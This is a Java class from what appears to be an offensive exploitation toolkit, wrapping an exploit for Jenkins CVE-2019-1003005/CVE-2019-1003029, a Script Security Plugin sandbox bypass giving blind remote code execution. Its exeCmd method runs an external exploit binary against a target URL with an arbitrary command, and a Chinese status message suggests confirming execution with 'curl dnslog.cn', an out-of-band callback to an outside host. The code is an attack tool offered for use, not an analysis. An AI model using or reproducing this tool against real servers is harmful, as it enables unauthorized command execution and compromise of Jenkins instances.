package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;

import java.io.IOException;

public class CVE_2019_1003005 implements ExploitInterface {

    private String url = "";

    @Override
    public String checkVul(String url) {
        this.url = url;
        return "[-] CVE-2019-1003005/CVE-2019-1003029 为无回显远程代码执行(Script Security Plugin沙箱绕过),请从文件读取/命令执行模块自行判断 eg: curl dnslog.cn (command)";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String os = System.getProperty("os.name").toLowerCase();
        String exp = "";
        if(os.contains("win")){
            exp = "CVE_2019_1003005.exe";
        }else if(os.contains("linux")) {
            exp = "./CVE_2019_1003005";
        }
        try {
            String command = String.format("%s %s \"%s\"",exp,this.url,cmd);
            Process process = Runtime.getRuntime().exec(command);
            System.out.println("exp: "+command);
            process.waitFor();
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }
        return "无回显命令执行,请自行验证";
    }

    @Override
    public boolean isVul() {
        return true;
    }
}